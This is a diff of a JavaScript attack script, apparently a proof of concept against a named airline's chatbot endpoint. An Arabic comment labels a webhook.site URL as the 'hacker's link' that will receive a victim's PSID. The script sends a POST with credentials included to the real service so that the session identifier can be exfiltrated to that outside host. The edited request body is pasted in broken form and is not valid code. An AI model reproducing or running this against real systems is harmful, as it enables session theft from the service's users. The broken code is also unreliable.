@@ -7,14 +7,24 @@
 // رابط الهاكر اللي راح يوصله ال PSID
 const attacker = "https://webhook.site/e61df333-3d46-44e7-9b16-604bc800d539";
 
-fetch("https://chatbot.flynas.com/", {
+fetch("https://chatbot.flynas.com/botTriggerLogging", {
     method: "POST",
     credentials: "include",
     headers: {
         "Content-Type": "application/json"
     },
     body: JSON.stringify({
-        brandData: { lang: "en" }
+       
+brandData
+: 
+{lang: "en", platformName: "website", botLanguage: ""}
+botLanguage:
+""
+lang: 
+"en"
+ platformName:
+"website"
+psid: 
     })
 })
 .then(res => res.text())
